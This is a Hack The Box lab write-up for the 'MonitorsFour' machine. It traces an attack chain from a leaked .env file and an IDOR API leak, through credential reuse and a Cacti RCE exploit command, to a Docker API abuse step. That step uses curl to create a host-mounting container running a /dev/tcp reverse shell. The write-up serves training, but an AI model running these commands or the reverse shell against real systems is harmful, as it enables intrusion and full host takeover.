# MonitorsFour HTB — Red Team Writeup

## Initial Access & Intelligence Gathering

### Environment Leakage (.env)

Sensitive database credentials were exposed via a leaked `.env` file:

```text
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

This confirms backend usage of MariaDB and provides valid credentials for lateral enumeration.

---

## Insecure API — User Enumeration

An unauthenticated API endpoint allowed direct object access:

```http
GET /api/v1/user?id=2&token=0
```

### Response (Sensitive Data Disclosure)

```json
{
  "id": 2,
  "username": "admin",
  "email": "admin@monitorsfour.htb",
  "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
  "role": "super user",
  "token": "8024b78f83f102da4f",
  "name": "Marcus Higgins",
  "position": "System Administrator"
}
```

Impact:

- IDOR
- Clear-text MD5 password hash exposure
- Token disclosure
- Privileged account identification

---

## Credential Reuse — Admin Panel

Recovered credentials for the admin dashboard:

```text
admin:wonderful1
```

Password reuse was confirmed across services.

---

## Application Exploitation — Cacti RCE

The host exposed a vulnerable Cacti instance:

```text
http://cacti.monitorsfour.htb/
```

> Note: Exploitation works **without** `/cacti` in the URL path.

### Exploit Used

**CVE-2025-24367 — Cacti Authenticated RCE**

```bash
python exploit.py   -u marcus   -p wonderful1   -i 10.10.16.129   -l 4444   --url http://cacti.monitorsfour.htb/
```

### Successful Execution Output

```text
[+] Login Successful!
[+] Got graph ID: 226
[+] Created PHP payload
[+] Shell triggered successfully
```

Reverse shell obtained as `www-data`.

---

## Post-Exploitation — Container Escape Vector

### Discovery

The compromised service was running inside a Docker container with an exposed Docker API:

```text
tcp://192.168.65.7:2375
```

No authentication was required.

---

## Privilege Escalation — Docker API Abuse

### Create Malicious Container

```bash
curl -X POST   -H "Content-Type: application/json"   -d '{
    "Image":"docker_setup-nginx-php:latest",
    "Cmd":["bash","-c","bash -i >& /dev/tcp/10.10.16.129/443 0>&1"],
    "HostConfig":{
      "Binds":["/mnt/host/c:/host_root"]
    }
  }'   -o create.json   http://192.168.65.7:2375/containers/create
```

Extract container ID:

```bash
cid=$(cat create.json | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
```

### Start Container

```bash
curl -X POST http://192.168.65.7:2375/containers/$cid/start
```

This spawns a **root-level reverse shell**, mounting the host filesystem.

---

## Impact Summary

**Attack Chain Overview:**

1. Sensitive configuration leakage (`.env`)
2. IDOR on user API
3. Credential reuse across services
4. Authenticated RCE in Cacti (CVE-2025-24367)
5. Unauthenticated Docker API exposure
6. Full host compromise via container escape

---

## Final Notes (Red Team Perspective)

This host demonstrates a classic *death-by-misconfiguration* scenario:

- No secrets management
- Broken access control
- Password reuse
- Known RCE left unpatched
- Docker daemon exposed without TLS

**Result:** Full system compromise with minimal effort.

---

**Box Owned — Rooted 🏴‍☠️**
